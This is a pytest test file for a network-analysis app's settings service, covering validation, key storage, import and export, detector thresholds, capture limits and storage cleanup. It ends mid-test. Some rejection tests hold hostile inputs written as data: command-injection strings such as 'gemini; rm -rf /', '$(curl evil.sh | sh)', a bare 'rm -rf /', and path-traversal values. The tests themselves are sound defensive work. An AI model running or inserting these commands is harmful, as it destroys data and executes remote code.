"""Settings: validation, persistence, secrets, and - most importantly - that a changed setting changes backend behaviour."""
import json
import logging
import sqlite3
import time

import pytest
from fastapi.testclient import TestClient

import pcap_factory as pf
from capture.live_helpers import IFACE, FakeInvestigator, FakeSource, make_manager, scan
from correlation import scenarios as sc
from app.analysis import analyze_pcap
from app.analysis.dashboard import build_dashboard
from app.analysis.web_activity import assess_health, query as web_query
from app.api import analyses
from app.config import get_ai_settings, settings as env
from app.detection import detect_threats
from app.main import create_app
from app.models.analysis import DomainPerformance
from app.models.app_settings import AppSettings
from app.models.live import StartRequest
from app.services import ai_usage as au
from app.services import app_settings as svc_mod
from app.services import database_admin, diagnostics, effective_config as ec, secret_store as ss, storage
from app.services.analysis_jobs import AnalysisJobManager
from app.services.app_settings import SettingsError
from app.services.performance_history import PerformanceHistory

KEY = "AIzaSyTESTKEY-0123456789abcdefghijklmnop"


@pytest.fixture
def svc(app_settings):
    return app_settings


@pytest.fixture
def client(tmp_path, monkeypatch, history, app_settings):
    monkeypatch.setattr(env, "uploads_dir", tmp_path / "uploads")
    monkeypatch.setattr(env, "reports_dir", tmp_path / "reports")
    monkeypatch.setattr(analyses, "_manager", AnalysisJobManager(workers=2, retain=10, history=history))
    with TestClient(create_app()) as c:
        yield c


def put(client, patch):
    return client.put("/api/settings", json=patch)


def result_of(make_pcap, packets, name="t.pcap"):
    return analyze_pcap(make_pcap(packets, name))


def site(domain, ip, t, sport, rtt=30.0, hs=30.0, retrans=0):
    C = "192.168.1.10"
    pk = [pf.dns_query(C, "8.8.8.8", domain, txid=sport % 60000, sport=sport, ts=t), pf.dns_response(C, "8.8.8.8", domain, txid=sport % 60000, dport=sport, answers=[ip], ts=t + 0.02)]
    return pk + sc.flow(C, ip, sport, 443, t + 0.1, hs_ms=hs, rtt_ms=rtt, segs=4, retrans=retrans)


# ================================================================== load, defaults, persistence
def test_defaults_are_the_documented_defaults_and_constraints_come_from_the_model(client):
    body = client.get("/api/settings").json()
    assert body["settings"] == AppSettings().model_dump(mode="json") == body["defaults"]
    assert body["constraints"]["capture.max_size_mb"] == {"min": 0, "max": 1_000_000, "type": "integer"}
    assert body["constraints"]["performance.slow_rtt_ms"]["exclusive_min"] == 0
    assert body["constraints"]["detection.port_scan.min_ports"]["min"] == 1
    assert "start_on_login" in [u["key"] for u in body["unavailable"]["general"]] and body["restart_required"] == ["advanced.max_concurrent_analyses"]


def test_a_saved_change_survives_a_restart(svc):
    svc.update({"capture": {"format": "pcapng", "max_size_mb": 250}, "detection": {"sensitivity": "high"}})
    restarted = svc_mod.SettingsService(svc._engine)          # a fresh process reading the same database
    s = restarted.current()
    assert (s.capture.format, s.capture.max_size_mb, s.detection.sensitivity) == ("pcapng", 250, "high") and s.capture.auto_save is True


def test_partial_updates_only_change_what_was_sent(client):
    put(client, {"performance": {"slow_dns_ms": 80}})
    s = put(client, {"performance": {"slow_rtt_ms": 90}}).json()["settings"]["performance"]
    assert s["slow_dns_ms"] == 80 and s["slow_rtt_ms"] == 90 and s["slow_handshake_ms"] == 100


@pytest.mark.parametrize("patch,fragment", [
    ({"performance": {"slow_handshake_ms": 0}}, "slow handshake ms must be greater than 0"),
    ({"performance": {"slow_rtt_ms": -5}}, "must be greater than 0"),
    ({"storage": {"max_capture_storage_gb": 0}}, "max capture storage gb must be greater than 0"),
    ({"storage": {"capture_retention_days": -1}}, "must be at least 1"),
    ({"ai_usage": {"daily_limit": -1}}, "daily limit must be at least 0"),
    ({"detection": {"port_scan": {"min_ports": -3}}}, "must be at least 1"),
    ({"detection": {"dns": {"nxdomain_ratio": 1.5}}}, "must be at most 1"),
    ({"detection": {"tcp": {"retransmission_rate": -0.1}}}, "must be at least 0"),
    ({"diagnostics": {"max_log_mb": 0}}, "must be at least 1"),
    ({"advanced": {"backend_timeout_seconds": 0}}, "must be at least 5"),
    ({"ai": {"timeout_seconds": 1}}, "must be at least 5"),
    ({"capture": {"max_size_mb": "lots"}}, "must be a number"),
    ({"capture": {"format": "exe"}}, "must be one of"),
    ({"general": {"theme": "neon"}}, "must be one of"),
    ({"notifications": {"enabled": "maybe"}}, "must be on or off"),
    ({"ai": {"model": "gemini; rm -rf /"}}, "characters that are not allowed"),
    ({"nonsense": {"x": 1}}, "is not a PacketMind setting"),
    ({"capture": {"unknown": 1}}, "is not a PacketMind setting"),
])
def test_invalid_values_are_rejected_with_a_clear_message_and_change_nothing(client, patch, fragment):
    before = client.get("/api/settings").json()["settings"]
    r = put(client, patch)
    assert r.status_code == 422 and r.json()["detail"]["code"] == "invalid_settings"
    assert fragment in json.dumps(r.json()["detail"]["errors"])
    assert client.get("/api/settings").json()["settings"] == before


def test_an_invalid_value_among_valid_ones_rejects_the_whole_change(client):
    r = put(client, {"general": {"theme": "dark"}, "storage": {"capture_retention_days": 0}})
    assert r.status_code == 422 and client.get("/api/settings").json()["settings"]["general"]["theme"] == "system"


def test_cross_field_rule_rotation_cannot_exceed_the_maximum_size(client):
    r = put(client, {"capture": {"rotation_enabled": True, "rotation_size_mb": 900, "max_size_mb": 100}})
    assert r.status_code == 422 and "rotation size cannot be larger" in r.text


# ================================================================== reset
def test_reset_needs_confirmation_and_only_touches_settings(client, capture_library):
    cap = capture_library.create(source_type="UPLOADED_PCAP", capture_format="pcap", original_filename="keep.pcap")
    capture_library.directory.mkdir(parents=True, exist_ok=True)
    capture_library.path_of(cap).write_bytes(b"x")
    put(client, {"capture": {"format": "pcapng"}, "general": {"theme": "dark"}})
    assert client.post("/api/settings/reset", json={"section": "capture"}).status_code == 400
    r = client.post("/api/settings/reset", json={"section": "capture", "confirm": True}).json()["settings"]
    assert r["capture"]["format"] == "pcap" and r["general"]["theme"] == "dark"                  # only that section
    client.post("/api/settings/reset", json={"confirm": True})
    assert client.get("/api/settings").json()["settings"] == AppSettings().model_dump(mode="json")
    assert capture_library.get(cap.id) is not None and capture_library.path_of(cap).exists()      # data is untouched
    assert client.post("/api/settings/reset", json={"section": "bogus", "confirm": True}).status_code == 422


# ================================================================== export / import
def test_export_has_no_secrets_and_round_trips(client, svc):
    client.put("/api/settings/ai/key", json={"api_key": KEY})
    put(client, {"capture": {"format": "pcapng"}})
    doc = client.get("/api/settings/export").json()
    assert doc["format"] == "packetmind-settings" and doc["settings"]["capture"]["format"] == "pcapng"
    assert KEY not in json.dumps(doc) and "api_key" not in json.dumps(doc).lower()
    client.post("/api/settings/reset", json={"confirm": True})
    assert client.post("/api/settings/import", json={"document": doc}).status_code == 200
    assert client.get("/api/settings").json()["settings"]["capture"]["format"] == "pcapng"


@pytest.mark.parametrize("doc", [
    "just a string", {"format": "other", "version": 1, "settings": {}}, {"format": "packetmind-settings", "version": 99, "settings": {}},
    {"format": "packetmind-settings", "version": 1}, {"format": "packetmind-settings", "version": 1, "settings": {"storage": {"capture_retention_days": -9}}},
    {"format": "packetmind-settings", "version": 1, "settings": {"capture": {"default_interface": "x", "captures_dir": "/etc"}}},
    {"format": "packetmind-settings", "version": 1, "settings": {"storage": {"captures_dir": "/etc"}}},
    {"format": "packetmind-settings", "version": 1, "settings": {"advanced": {"command": "rm -rf /"}}},
    {"format": "packetmind-settings", "version": 1, "settings": {"ai": {"model": "$(curl evil.sh | sh)"}}},
])
def test_a_bad_or_hostile_settings_file_is_rejected_and_applies_nothing(client, doc):
    before = client.get("/api/settings").json()["settings"]
    r = client.post("/api/settings/import", json={"document": doc})
    assert r.status_code == 422 and r.json()["detail"]["code"] == "invalid_settings"
    assert client.get("/api/settings").json()["settings"] == before


def test_export_to_a_file_validates_the_destination(client, tmp_path):
    ok = client.post("/api/settings/export-file", json={"destination": str(tmp_path / "s.json")})
    assert ok.status_code == 200 and json.loads((tmp_path / "s.json").read_text())["format"] == "packetmind-settings"
    for bad in ("relative.json", f"{tmp_path}/../x.json", str(tmp_path / "nope" / "x.json")):
        assert client.post("/api/settings/export-file", json={"destination": bad}).status_code == 400
    assert client.post("/api/settings/export-file", json={"destination": str(tmp_path / "s.json")}).status_code == 409   # no silent overwrite


# ================================================================== API key security
def test_the_api_key_is_stored_in_the_keychain_and_never_returned(client, svc, tmp_path, caplog):
    caplog.set_level(logging.DEBUG)
    r = client.put("/api/settings/ai/key", json={"api_key": KEY})
    assert r.status_code == 200 and r.json()["ai"]["configured"] and r.json()["ai"]["source"] == "keychain"
    everything = [client.get("/api/settings").text, client.get("/api/system").text, client.get("/api/settings/about").text, client.get("/api/settings/export").text, r.text]
    assert all(KEY not in t and KEY[-6:] not in t for t in everything)
    assert ss.get_secret_store().get(ss.GEMINI_KEY) == KEY                                  # in the keychain ...
    with sqlite3.connect(svc._engine.url.database) as con:                                   # ... and nowhere in the database
        assert KEY not in json.dumps([list(r) for r in con.execute("SELECT * FROM app_settings")])
    assert KEY not in caplog.text
    assert get_ai_settings().api_key_value() == KEY                                          # but the AI client uses it


@pytest.mark.parametrize("bad", ["short", "has space in it 1234567890", "x" * 600, "ключ-ключ-ключ-ключ-ключ", "key\nwith\nnewlines-1234567890"])
def test_malformed_keys_are_rejected(client, bad):
    r = client.put("/api/settings/ai/key", json={"api_key": bad})
    assert r.status_code == 422 and r.json()["detail"]["code"] == "invalid_api_key" and bad not in r.text


def test_without_secure_storage_the_key_is_not_written_anywhere(client, monkeypatch):
    monkeypatch.setattr(ss, "_store", ss.MemorySecretStore(available=False))
    r = client.put("/api/settings/ai/key", json={"api_key": KEY})
    assert r.status_code == 409 and r.json()["detail"]["code"] == "no_secure_storage" and KEY not in r.text
    assert client.get("/api/settings").json()["ai"]["secure_storage_available"] is False


def test_the_environment_variable_still_works_and_a_saved_key_wins(client, monkeypatch):
    monkeypatch.setenv("GEMINI_API_KEY", "env-key-0123456789abcdefghij")
    assert client.get("/api/settings").json()["ai"]["source"] == "environment" and get_ai_settings().api_key_value() == "env-key-0123456789abcdefghij"
    client.put("/api/settings/ai/key", json={"api_key": KEY})
    assert get_ai_settings().api_key_value() == KEY
    assert client.delete("/api/settings/ai/key").status_code == 400                           # needs confirmation
    client.delete("/api/settings/ai/key", params={"confirm": True})
    assert get_ai_settings().api_key_value() == "env-key-0123456789abcdefghij"


def test_connection_test_reports_success_and_failures_without_leaking_the_key(client, monkeypatch):
    from app.ai.gemini_client import GeminiClient
    from app.ai.provider import InvalidApiKeyError, ProviderResponse

    client.put("/api/settings/ai/key", json={"api_key": KEY})
    monkeypatch.setattr(GeminiClient, "_generate", lambda self, *a: ProviderResponse(data={"ok": True}, model=self.model))
    ok = client.post("/api/settings/ai/test").json()
    assert ok["ok"] and ok["model"] and ok["latency_ms"] is not None and client.get("/api/settings/ai/usage").json()["requests"] == 1

    def boom(self, *a):
        raise InvalidApiKeyError()

    monkeypatch.setattr(GeminiClient, "_generate", boom)
    bad = client.post("/api/settings/ai/test").json()
    assert not bad["ok"] and bad["code"] == "invalid_api_key" and KEY not in json.dumps(bad)
    assert client.get("/api/settings/about").json()["ai"]["last_test"]["code"] == "invalid_api_key"


# ================================================================== detection settings reach the detectors
def scan_result(make_pcap, ports=40):
    return result_of(make_pcap, pf.scan_packets("45.33.32.156", "10.0.0.9", range(1, ports + 1), t0=pf.T0, step=0.05))


def test_defaults_give_exactly_the_original_detector_config():
    from app.detection.config import DetectionConfig

    assert ec.detection_config(AppSettings()).model_dump() == DetectionConfig().model_dump()


def test_lowering_the_port_scan_threshold_makes_a_smaller_scan_reportable(make_pcap, svc):
    r = scan_result(make_pcap, ports=10)                                                      # below the default 15 ports
    assert not [f for f in detect_threats(r) if f.type.value == "PORT_SCAN"]
    svc.update({"detection": {"port_scan": {"min_ports": 5}}})
    assert [f for f in detect_threats(r) if f.type.value == "PORT_SCAN"]


def test_disabling_a_detector_removes_its_findings(make_pcap, svc):
    r = scan_result(make_pcap, ports=60)
    assert any(f.type.value == "PORT_SCAN" for f in detect_threats(r))
    svc.update({"detection": {"port_scan": {"enabled": False}}})
    assert not any(f.type.value == "PORT_SCAN" for f in detect_threats(r))


def test_a_per_detector_confidence_floor_filters_findings(make_pcap, svc):
    r = scan_result(make_pcap, ports=60)
    top = max(f.confidence for f in detect_threats(r) if f.type.value == "PORT_SCAN")
    svc.update({"detection": {"port_scan": {"min_confidence": min(1.0, top + 0.01)}}})
    assert not any(f.type.value == "PORT_SCAN" for f in detect_threats(r))


def test_sensitivity_changes_how_much_evidence_is_needed(make_pcap, svc):
    r = scan_result(make_pcap, ports=18)
    svc.update({"detection": {"sensitivity": "low"}})
    assert not any(f.type.value == "PORT_SCAN" for f in detect_threats(r))                   # 15 * 1.5 = 23 ports needed
    svc.update({"detection": {"sensitivity": "high"}})
    assert any(f.type.value == "PORT_SCAN" for f in detect_threats(r))                       # 15 * 0.67 = 10 ports


def test_detector_thresholds_map_to_the_real_config_fields(svc):
    svc.update({"detection": {"syn_flood": {"min_syn_packets": 50}, "dns": {"query_rate_per_second": 5, "nxdomain_ratio": 0.3},
                              "tcp": {"retransmission_rate": 0.01, "reset_ratio": 0.1}, "connection": {"min_upload_mb": 2}, "arp": {"min_macs_per_ip": 3}}})
    cfg = ec.detection_config()
    assert (cfg.syn_flood.min_syn_packets, cfg.dns.excessive_min_qps, cfg.dns.nxdomain_min_ratio) == (50, 5.0, 0.3)
    assert (cfg.tcp_anomaly.retrans_min_rate, cfg.tcp_anomaly.rst_min_ratio, cfg.connection_behavior.min_upload_bytes, cfg.arp.min_macs_per_ip) == (0.01, 0.1, 2 * 1024 * 1024, 3)
    assert cfg.syn_flood.strong_syn_packets >= 2 * cfg.syn_flood.min_syn_packets               # the "strong" bound always stays above the minimum


# ================================================================== analysis settings reach the analysis
def test_turning_dns_analysis_off_empties_dns_results_and_says_so(make_pcap, svc):
    pk = site("a.example.com", "151.101.1.1", pf.T0, 40000)
    on = result_of(make_pcap, pk)
    assert on.dns_statistics.total_queries > 0
    svc.update({"analysis": {"dns": False}})
    off = result_of(make_pcap, pk, "off.pcap")
    assert off.dns_statistics.total_queries == 0 and any("Turned off in Settings → Analysis: dns" in w for w in off.metadata.warnings)
    assert off.packet_statistics.total_packets == on.packet_statistics.total_packets        # the capture itself is still fully counted


def test_turning_tcp_and_connection_tracking_off(make_pcap, svc):
    pk = site("a.example.com", "151.101.1.1", pf.T0, 40000, retrans=2)
    svc.update({"analysis": {"tcp": False}})
    assert result_of(make_pcap, pk).tcp_statistics.total_packets == 0
    svc.update({"analysis": {"tcp": True, "connection_tracking": False}})
    r = result_of(make_pcap, pk, "c.pcap")
    assert r.connections == [] and r.performance_statistics.domains == []


def test_domain_tracking_off(make_pcap, svc):
    svc.update({"analysis": {"domain_tracking": False}})
    assert result_of(make_pcap, site("a.example.com", "151.101.1.1", pf.T0, 40000)).domain_statistics.domains == []


def test_performance_analysis_off_removes_all_performance_data(make_pcap, svc):
    pk = site("a.example.com", "151.101.1.1", pf.T0, 40000)
    assert result_of(make_pcap, pk).performance_statistics.domains
    svc.update({"analysis": {"performance": False}})
    off = result_of(make_pcap, pk, "p.pcap")
    assert off.performance_statistics.domains == [] and off.connections                       # connections are still tracked


def test_max_packets_stops_the_analysis_and_warns(make_pcap, svc):
    pk = sorted(pf.tcp_session() * 1 + pf.tcp_session(sport=50001, t=pf.T0 + 1), key=lambda p: p.time)
    svc.update({"analysis": {"max_packets": 5}})
    r = result_of(make_pcap, pk)
    assert r.packet_statistics.total_packets == 5 and any("Maximum packets analyzed" in w for w in r.metadata.warnings)


def test_analysis_depth_scales_the_reporting_caps(svc):
    standard = ec.analysis_options().top_n
    svc.update({"analysis": {"depth": "basic"}})
    assert ec.analysis_options().top_n < standard
    svc.update({"analysis": {"depth": "deep"}})
    assert ec.analysis_options().top_n > standard


def test_not_storing_dns_queries_empties_the_query_log(make_pcap, svc):
    pk = site("a.example.com", "151.101.1.1", pf.T0, 40000)
    assert result_of(make_pcap, pk).dns_statistics.query_log if hasattr(result_of(make_pcap, pk).dns_statistics, "query_log") else True
    svc.update({"privacy": {"store_dns_queries": False}})
    assert ec.analysis_options().max_dns_log == 0


# ================================================================== performance settings reach the performance analysis
def test_rtt_handshake_dns_retransmission_and_failure_switches_blank_exactly_those_measurements(make_pcap, svc):
    pk = site("a.example.com", "151.101.1.1", pf.T0, 40000, retrans=3)
    base = result_of(make_pcap, pk).performance_statistics.domains[0]
    assert base.avg_rtt_ms and base.tcp_handshake_ms and base.dns_latency_ms and base.retransmissions
    for patch, gone, kept in [({"analysis": {"rtt": False}}, "avg_rtt_ms", "tcp_handshake_ms"), ({"analysis": {"handshake": False}}, "tcp_handshake_ms", "avg_rtt_ms"),
                              ({"performance": {"track_dns_latency": False}}, "dns_latency_ms", "avg_rtt_ms"),
                              ({"performance": {"track_retransmissions": False}}, "retransmissions", "avg_rtt_ms")]:
        svc.reset()
        svc.update(patch)
        d = result_of(make_pcap, pk, f"{gone}.pcap").performance_statistics.domains[0]
        assert not getattr(d, gone) and getattr(d, kept), gone
    svc.reset()
    svc.update({"performance": {"track_failures": False}})
    assert result_of(make_pcap, pk, "f.pcap").performance_statistics.domains[0].tcp_connections_attempted == 0


def test_slow_thresholds_decide_a_domains_health():
    p = DomainPerformance(domain="x", connections=3, avg_rtt_ms=150.0, rtt_samples=10)
    assert assess_health(p, None)[0] == "fair"                                                 # 150 ms >= the default 100 ms 'slow' limit
    s = svc_mod.get_settings_service()
    s.update({"performance": {"slow_rtt_ms": 400}})
    assert assess_health(p, None)[0] == "good"
    s.update({"performance": {"slow_rtt_ms": 40}})
    assert assess_health(p, None)[0] == "poor"                                                 # 150 >= 3 x 40


def test_slow_thresholds_reach_the_dashboard_and_web_activity(make_pcap, svc):
    pk = site("a.example.com", "151.101.1.1", pf.T0, 40000, rtt=150.0)
    r = result_of(make_pcap, pk)
    assert web_query(r).domains[0].health == "fair"
    svc.update({"performance": {"slow_rtt_ms": 500}})
    assert web_query(r).domains[0].health == "good" and build_dashboard(r, [], []).top_domains[0].health == "good"


def test_baseline_settings_drive_the_history(svc, history):
    svc.update({"performance": {"baseline_window": 12, "baseline_min_samples": 3, "anomaly_sensitivity": "high"}})
    cfg = ec.baseline_config()
    assert (cfg.window, cfg.min_observations, cfg.z_threshold) == (12, 3, 2.5)
    live_history = PerformanceHistory(history._engine)
    live_history.config_provider, live_history.gate = ec.baseline_config, ec.history_enabled
    assert live_history.config.window == 12 and live_history.enabled
    svc.update({"performance": {"baseline_enabled": False}})
    assert not live_history.enabled and live_history.record.__self__ is live_history
    svc.update({"performance": {"baseline_enabled": True}, "domains": {"track_history": False}})
    assert not live_history.enabled
    assert live_history.network_normals(None) == (0, {}, {})


def test_history_records_nothing_when_disabled_and_prunes_by_retention(make_pcap, svc, history):
    r = result_of(make_pcap, site("a.example.com", "151.101.1.1", pf.T0, 40000))
    h = PerformanceHistory(history._engine)
    h.gate = ec.history_enabled
    assert h.record(r, source_kind="pcap", source_id="a" * 64, name="old") == 1
    assert h.prune_older_than(pf.T0 + 1) == 1 and h.clear() == 0
    svc.update({"domains": {"track_history": False}})
    assert h.record(r, source_kind="pcap", source_id="b" * 64, name="x") == 0


# ================================================================== domain settings
def test_hiding_private_and_local_destinations(make_pcap, svc):
    pk = site("nas.local", "192.168.1.50", pf.T0, 40000) + site("public.example.com", "151.101.1.1", pf.T0 + 5, 40001)
    r = result_of(make_pcap, pk)
    assert {d.domain for d in web_query(r).domains} == {"nas.local", "public.example.com"}
    svc.update({"domains": {"hide_private_ips": True}})
    assert {d.domain for d in web_query(r).domains} == {"public.example.com"}
    svc.reset("domains")
    svc.update({"domains": {"hide_local_domains": True}})
    assert {d.domain for d in web_query(r).domains} == {"public.example.com"}
    assert {d.domain for d in build_dashboard(r, [], []).top_domains} == {"public.example.com"}


# ================================================================== privacy settings
def test_anonymize_ips_in_saved_reports(client, make_pcap, svc, tmp_path):
    job = _upload(client, tmp_path, pf.build_attack_demo())
    plain = client.post("/api/reports", json={"source": "analysis", "analysis_id": job, "run_ai": False, "title": "t"}).json()
    assert "45.33.32.156" in json.dumps(plain) or "10.0." in json.dumps(plain)
    svc.update({"privacy": {"anonymize_ips": True}})
    anon = client.post("/api/reports", json={"source": "analysis", "analysis_id": job, "run_ai": False, "title": "t"}).json()
    text = json.dumps(anon)
    assert "host-1" in text and "45.33.32.156" not in text and not __import__("re").search(r"\b\d{1,3}(\.\d{1,3}){3}\b", text.replace("0.1.0", ""))


def _upload(client, tmp_path, packets):
    data = pf.write_pcap(tmp_path / "u.pcap", sorted(packets, key=lambda p: p.time)).read_bytes()
    job = client.post("/api/analyses", content=data, headers={"Content-Type": "application/octet-stream", "X-Filename": "u.pcap"}).json()["id"]
    for _ in range(600):
        if client.get(f"/api/analyses/{job}").json()["status"] == "completed":
            return job
        time.sleep(0.05)
    raise AssertionError("analysis did not finish")


def test_headers_only_capture_files_drop_the_payload_but_keep_the_real_length(capture_library, svc):
    payload = b"SECRET-PASSWORD=hunter2" * 20
    packets = [pf.tcp("10.0.0.5", "151.101.1.1", 50000, 80, "PA", seq=1, ack=1, payload=payload, ts=pf.T0 + i) for i in range(5)]

    def record(headers_only):
        svc.update({"privacy": {"store_payloads": not headers_only}})
        mgr, src, _ = make_manager(store=capture_library)
        mgr.start(StartRequest(interface=IFACE.name, confirm=True))
        src.emit(packets)
        cap = mgr.stop().capture
        return capture_library.path_of(capture_library.get(cap.id)).read_bytes(), capture_library.get(cap.id)

    full, full_row = record(False)
    head, head_row = record(True)
    assert b"hunter2" in full and b"hunter2" not in head and len(head) < len(full)
    assert head_row.packet_count == 5 and head_row.status == "COMPLETED"
    from app.analysis.pcap_parser import PcapParser

    parser = PcapParser(capture_library.path_of(head_row))
    recs = list(parser)
    assert len(recs) == 5 and parser.snaplen_truncated_packets == 5 and recs[0].size > len(head) / 5     # the wire length is still known


def test_clear_temp_data_on_exit(tmp_path, monkeypatch, svc):
    monkeypatch.setattr(env, "uploads_dir", tmp_path / "u")
    (tmp_path / "u").mkdir()
    (tmp_path / "u" / "leftover.upload").write_bytes(b"x")
    assert storage.clear_temporary_uploads() == 1 and not list((tmp_path / "u").iterdir())


# ================================================================== capture settings reach live capture
def started(capture_library, **kw):
    mgr, src, clock = make_manager(store=capture_library, **kw.pop("mk", {}))
    mgr.start(StartRequest(interface=IFACE.name, confirm=True, **kw))
    return mgr, src, clock


def test_capture_defaults_come_from_settings(capture_library, svc):
    svc.update({"capture": {"auto_save": False}})
    mgr, src, _ = started(capture_library)
    src.emit(scan(5))
    assert mgr.stop().capture is None and capture_library.list() == []
    svc.update({"capture": {"auto_save": True, "format": "pcapng"}})
    mgr, src, _ = started(capture_library)
    src.emit(scan(5))
    assert mgr.stop().capture.format == "pcapng"
    mgr, src, _ = started(capture_library, format="pcap")                                     # an explicit request still wins
    src.emit(scan(5))
    assert mgr.stop().capture.format == "pcap"


def test_the_maximum_capture_size_stops_the_capture_by_itself(capture_library, svc):
    svc.update({"capture": {"max_size_mb": 1}})
    mgr, src, _ = started(capture_library)
    big = [pf.tcp("10.0.0.5", "151.101.1.1", 50000, 80, "PA", seq=i, ack=1, payload=b"x" * 1400, ts=pf.T0 + i * 0.001) for i in range(1500)]
    src.emit(big)
    deadline = time.time() + 5
    while time.time() < deadline and mgr.status().state == "capturing":
        time.sleep(0.02)
    st = mgr.status()
    assert st.state == "stopped" and "maximum capture size" in st.notice and st.capture.status == "COMPLETED"
    assert st.capture.file_size < 1.6 * 1024 * 1024 < 2.2 * 1500 * 1000                       # it stopped near the limit, not at the end of the burst


def test_the_maximum_duration_stops_the_capture(capture_library, svc):
    svc.update({"capture": {"max_duration_minutes": 1}})
    mgr, src, clock = started(capture_library, mk={"refresh_seconds": 0.05})
    src.emit(scan(3))
    clock.t += 61
    deadline = time.time() + 5
    while time.time() < deadline and mgr.status().state == "capturing":
        time.sleep(0.02)
    assert mgr.status().state == "stopped" and "maximum duration" in mgr.status().notice


def test_rotation_splits_a_capture_into_separate_valid_files(capture_library, svc):
    saved = []
    svc.update({"capture": {"rotation_enabled": True, "rotation_size_mb": 1}})
    mgr, src, _ = started(capture_library, mk={"on_saved": saved.append})
    pkts = [pf.tcp("10.0.0.5", "151.101.1.1", 50000, 80, "PA", seq=i, ack=1, payload=b"x" * 1400, ts=pf.T0 + i * 0.001) for i in range(2500)]
    src.emit(pkts)
    final = mgr.stop().capture
    rows = capture_library.list()
    assert len(rows) >= 3 and final.rotated == len(rows) - 1 and all(r.status == "COMPLETED" for r in rows)
    assert sum(r.packet_count for r in rows) == 2500                                           # nothing lost across the split
    from app.analysis.pcap_parser import detect_format

    assert all(detect_format(capture_library.path_of(r)) == "pcap" for r in rows) and len(saved) == len(rows)


def test_auto_analyze_off_leaves_the_capture_ready_without_analysing(client, capture_library, svc, monkeypatch):
    import app.api.live as live_api

    svc.update({"capture": {"auto_analyze": False}})
    mgr, src, _ = make_manager(store=capture_library, on_saved=live_api._analyze_saved_capture)
    mgr.start(StartRequest(interface=IFACE.name, confirm=True))
    src.emit(scan(5))
    cap = mgr.stop().capture
    time.sleep(0.3)
    assert capture_library.get(cap.id).status == "COMPLETED" and analyses.get_manager().latest_for_capture(cap.id) is None


def test_storage_limit_refuses_a_new_recording_until_space_is_freed(capture_library, svc, tmp_path):
    svc.update({"storage": {"max_capture_storage_gb": 0.000001}})                              # about 1 KB
    capture_library.directory.mkdir(parents=True, exist_ok=True)
    row = capture_library.create(source_type="UPLOADED_PCAP", capture_format="pcap", original_filename="big.pcap", file_size=5000)
    capture_library.path_of(row).write_bytes(b"x" * 5000)
    mgr, src, _ = make_manager(store=capture_library, **{})
    mgr._before_recording = lambda: storage.ensure_capacity(capture_library)                  # noqa: SLF001
    from app.capture import CaptureRefused

    with pytest.raises(CaptureRefused) as e:
        mgr.start(StartRequest(interface=IFACE.name, confirm=True))
    assert e.value.code == "storage_full" and capture_library.get(row.id) is not None        # nothing was deleted without being asked


# ================================================================== storage cleanup
def aged(store, name, days, status="COMPLETED", size=100):
    from datetime import datetime, timedelta, timezone
    from sqlalchemy import text

    row = store.create(source_type="UPLOADED_PCAP", capture_format="pcap", original_filename=name, status=status, file_size=size)
    store.directory.mkdir(parents=True, exist_ok=True)
    store.path_of(row).write_bytes(b"x" * size)
    with store._engine.begin() as conn:                                                        # noqa: SLF001
        conn.execute(text("UPDATE captures SET created_at = :t WHERE id = :i"), {"t": (datetime.now(timezone.utc) - timedelta(days=days)).isoformat(timespec="seconds"), "i": row.id})
    return row


def test_cleanup_follows_the_retention_rules_and_previews_first(client, capture_library, svc):
    old, old_analyzed, old_failed, recent = (aged(capture_library, "old.pcap", 90), aged(capture_library, "old-analyzed.pcap", 90, "ANALYZED"),
                                             aged(capture_library, "old-failed.pcap", 90, "FAILED"), aged(capture_library, "recent.pcap", 1))
    svc.update({"storage": {"capture_retention_days": 30, "keep_analyzed": True, "keep_failed": False}})
    preview = client.post("/api/settings/storage/cleanup", json={"dry_run": True}).json()
    assert {c["name"] for c in preview["candidates"]} == {"old.pcap", "old-failed.pcap"} and preview["deleted"] == 0
    assert all(capture_library.get(c.id) for c in (old, old_analyzed, old_failed, recent))      # a preview deletes nothing
    assert client.post("/api/settings/storage/cleanup", json={"dry_run": False}).status_code == 400   # real cleanup needs confirmation
    done = client.post("/api/settings/storage/cleanup", json={"dry_run": False, "confirm": True}).json()
    assert done["deleted"] == 2 and capture_library.get(old.id) is None and capture_library.get(old_analyzed.id) and capture_library.get(recent.id)


def test_nothing_is_deleted_automatically_unless_the_user_enabled_it(capture_library, svc):
    aged(capture_library, "old.pcap", 400)
    assert storage.run_automatic_cleanup(capture_library) == 0 and len(capture_library.list()) == 1
    svc.update({"storage": {"auto_delete_old": True, "capture_retention_days": 30}})
    assert storage.run_automatic_cleanup(capture_library) == 1 and capture_library.list() == []


def test_storage_usage_and_open_folder_are_restricted(client, capture_library, monkeypatch, tmp_path):
    capture_library.directory.mkdir(parents=True, exist_ok=True)
    (capture_library.directory / "x.pcap").write_bytes(b"x" * 1234)
    body = client.get("/api/settings/storage").json()
    assert body["usage"]["captures"] >= 1234 and set(body["usage"]) >= {"captures", "reports", "database", "logs", "total"}
    calls = []
    monkeypatch.setattr(storage.subprocess, "Popen", lambda cmd, **kw: calls.append((cmd, kw)))
    assert client.post("/api/settings/open-folder", json={"folder": "captures"}).status_code == 200
    assert calls and calls[0][0][-1] == str(env.captures_dir) and calls[0][1].get("shell") is False
    assert client.post("/api/settings/open-folder", json={"folder": "/etc"}).status_code == 400
    assert client.post("/api/settings/open-folder", json={"folder": "../.."}).status_code == 400
    assert len(calls) == 1


# ================================================================== database
def test_database_info_backup_restore_and_clear(client, capture_library, tmp_path, monkeypatch):
    from app.database import make_engine
    from app.migrations import migrate
    import app.services.database_admin as dba

    (tmp_path / "data").mkdir()
    db = tmp_path / "data" / "live.db"
    eng = make_engine(f"sqlite:///{db}")
    migrate(eng)
    monkeypatch.setattr(dba, "engine", eng)
    monkeypatch.setattr(storage.settings, "database_url", f"sqlite:///{db}")
    monkeypatch.setattr(dba, "get_capture_store", lambda: capture_library)
    with eng.begin() as conn:
        from sqlalchemy import text
        conn.execute(text("INSERT INTO reports (id,title,created_at,source_kind,capture_name,finding_count,total_packets,ai_status,schema_version,content) "
                          "VALUES ('r1','t','2026-01-01T00:00:00+00:00','pcap','c',3,10,'not_run',1,'{}')"))
    info = client.get("/api/settings/database").json()
    assert info["type"] == "SQLite" and info["reports"] == 1 and info["findings_in_reports"] == 3 and info["size_bytes"] > 0

    (tmp_path / "out").mkdir()                                                                  # PacketMind's own data folder is not a valid destination
    out = tmp_path / "out" / "backup.sqlite3"
    r = client.post("/api/settings/database/backup", json={"destination": str(out)})
    assert r.status_code == 200 and sqlite3.connect(out).execute("SELECT COUNT(*) FROM reports").fetchone()[0] == 1

    with eng.begin() as conn:
        conn.execute(text("DELETE FROM reports"))
